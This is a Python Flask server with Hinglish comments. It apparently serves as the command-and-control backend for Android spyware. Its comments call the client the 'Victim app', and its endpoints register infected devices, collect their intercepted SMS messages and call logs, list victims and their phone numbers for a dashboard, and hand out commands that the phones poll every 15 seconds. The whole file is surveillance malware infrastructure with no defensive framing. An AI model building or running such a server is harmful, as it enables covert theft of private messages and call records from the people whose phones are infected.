from flask import Flask, request, jsonify
from flask_cors import CORS
import json

app = Flask(__name__)
CORS(app)  # Sabhi devices ko connect karne ki permission

# ==========================================
# DATA STORE (Abhi ke liye memory mein save hoga)
# ==========================================
devices = {}        # device_id -> device info
sms_store = {}      # device_id -> list of sms
call_store = {}     # device_id -> list of calls

# ==========================================
# 1. REGISTER API (Victim app se pehla data aayega)
# ==========================================
@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({"error": "No device_id"}), 400
    
    devices[device_id] = data
    sms_store[device_id] = []
    call_store[device_id] = []
    
    print(f"[+] Device Registered: {device_id}")
    return jsonify({"status": "success", "device_id": device_id}), 200

# ==========================================
# 2. SMS RECEIVE API (Victim app se SMS aayegi)
# ==========================================
@app.route('/api/sms', methods=['POST'])
def receive_sms():
    data = request.get_json()
    device_id = data.get('device_id')
    
    if device_id and device_id in sms_store:
        sms_store[device_id].append(data)
        print(f"[+] SMS from {device_id}: {data.get('body')}")
        return jsonify({"status": "received"}), 200
    
    return jsonify({"error": "Device not found"}), 404

# ==========================================
# 3. CALL RECEIVE API (Victim app se call data aayega)
# ==========================================
@app.route('/api/call', methods=['POST'])
def receive_call():
    data = request.get_json()
    device_id = data.get('device_id')
    
    if device_id and device_id in call_store:
        call_store[device_id].append(data)
        print(f"[+] Call from {device_id}: {data.get('type')}")
        return jsonify({"status": "received"}), 200
    
    return jsonify({"error": "Device not found"}), 404

# ==========================================
# 4. DEVICES LIST API (Dashboard ke liye)
# ==========================================
@app.route('/api/devices', methods=['GET'])
def get_devices():
    device_list = []
    for device_id, info in devices.items():
        device_list.append({
            "id": device_id,
            "device_name": info.get("device_name", "Unknown"),
            "phone": info.get("phone", ""),
            "status": info.get("status", "Online"),
            "name": info.get("name", "")
        })
    return jsonify({"devices": device_list}), 200

# ==========================================
# 5. COMMAND FETCH API (Victim app har 15 sec mein yeh call karegi)
# ==========================================
@app.route('/api/commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    # Abhi ke liye empty command return kar rahe hain
    return jsonify({
        "command": "",
        "data": ""
    }), 200

# ==========================================
# 6. RUN SERVER
# ==========================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
